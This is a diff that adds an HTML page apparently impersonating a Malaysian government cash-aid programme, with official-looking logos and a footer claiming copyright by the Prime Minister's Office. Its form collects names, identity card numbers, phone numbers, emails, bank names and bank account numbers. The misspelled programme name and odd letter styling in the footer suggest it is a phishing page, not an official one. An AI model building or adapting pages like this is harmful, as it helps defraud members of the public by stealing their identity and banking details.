@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sumbangan Tunai Ramah 2024</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+        }
+        .banner{
+            background-image: url("https://vectorise.net/logo/wp-content/uploads/2023/05/Malaysia-Madani-01.png");
+            background-size: contain;
+            position: absolute;
+            top: 0;
+            width: 100%;
+            height: 100px;
+        }
+        .container1 {
+            display: block;
+            background-image: url("https://bm.soyacincau.com/wp-content/uploads/2024/01/240126-STR-2024-MOF-wang-ringgit.jpg");
+            background-size: cover;
+            background-position: left;
+            padding: 200px 0;
+        }
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 50px 100px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .footer {
+            padding: 10px;
+            background-color: #3987cb;
+            text-align: center;
+            color: #fff;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        input[type="text"],
+        input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            width: 104%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #3987cb;
+            color: #fff;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+        .special-letter {
+            font-family: "Comic Sans MS"; 
+        }
+        #bank {
+            width: 104%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+    </style>
+</head>
+<body>
+    
+    <div class="container1"> 
+        <div class="banner">
+        </div>
+    </div>
+    <div class="container">
+        <h2>Masukkan Maklumat Anda</h2>
+        <form action="/submit" method="post">
+            <input type="text" name="name" placeholder="Nama" required><br>
+            <input type="text" name="ic_number" placeholder="Nombor Kad Pengenalan" required><br>
+            <input type="text" name="phone_number" placeholder="Nombor Telefon" required><br>
+            <input type="email" name="email" placeholder="Alamat Emel" required><br>
+            <select id="bank" name="bank_name">
+                <option value="" disabled selected>Pilihan Bank</option>
+                <option value="Malayan Banking Berhad">Malayan Banking Berhad</option>
+                <option value="CIMB Group Holdings">CIMB Group Holdings</option>
+                <option value="Public Bank Berhad">Public Bank Berhad</option>
+                <option value="RHB Bank">RHB Bank</option>
+                <option value="Hong Leong Bank">Hong Leong Bank</option>
+                <option value="AmBank">AmBank</option>
+                <option value="UOB Malaysia">UOB Malaysia</option>
+                <option value="Bank Rakyat">Bank Rakyat</option>
+                <option value="HSBC Bank Malaysia">HSBC Bank Malaysia</option>
+                <option value="Bank Islam Malaysia">Bank Islam Malaysia</option>
+                <option value="Affin Bank">Affin Bank</option>
+                <option value="Bank Simpanan Nasional (BSN)">Bank Simpanan Nasional (BSN)</option>
+                <!-- Add more options as needed -->
+            </select>
+            <input type="text" name="account_number" placeholder="Nombor Akaun Bank" required><br>
+            <input type="submit" value="Hantar">
+        </form>
+    </div>
+    <div class="footer">
+        <pre>Hakcipta © 2024 Pej<span class="special-letter">a</span>b<span class="special-letter">a</span>t Perd<span class="special-letter">a</span>n<span class="special-letter">a</span> Menteri. Hak cipta terpelihara.                                                                        Terms & Conditions | Disclaimer | Privacy Policy | Copyright Notice</pre>
+    </div>  
+</body>
+</html>
